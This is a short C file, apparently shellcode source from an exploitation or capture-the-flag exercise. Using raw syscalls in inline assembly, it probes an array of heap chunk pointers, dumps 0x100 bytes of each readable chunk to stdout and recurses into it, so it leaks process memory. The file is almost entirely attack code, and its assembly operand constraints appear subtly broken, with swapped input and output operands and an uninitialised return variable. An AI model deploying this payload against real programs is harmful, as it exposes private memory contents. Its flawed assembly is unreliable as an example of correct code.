#include <stdint.h>

typedef struct chunks {
	void *p[16];
} chunks;


int probe(void *chunk);
int dump(void *chunk);

int main(){}

int shellcode(void *first_chunk){ //rdi
	chunks *c1 = (chunks*)first_chunk;

	for(int i = 0; i < 16; i++){
		void *a = c1->p[i];
		void *aa = a + 0x400;
		int ret;
		__asm__ (
			"xor %%rax, %%rax;"
			"movq $0, %%rdi;"
			"movq %0, %%rsi;"
			"movq $1, %%rdx;"
			// "int3;"
			"syscall;"
			"movq %%rax, %1;"
			: "=m"(aa) : "m"(ret) : "%rax","%rdi","%rsi","%rdx"
		);

		if(ret >= 0){
			__asm__ (
				"movq $1, %%rax;"
				"movq $1, %%rdi;"
				"movq %0, %%rsi;"
				"movq $0x100, %%rdx;"
				// "int3;"
				"syscall;"
				: "=m"(a) : : "%rax","%rdi","%rsi","%rdx"
			);
			shellcode(a);
		}
	}

	__asm__ (
		"movq $0x3c, %%rax;"
		"movq $0, %%rdi;"
		// "int3;"
		"syscall;"
		: : : "%rax","%rdi"
	);
}
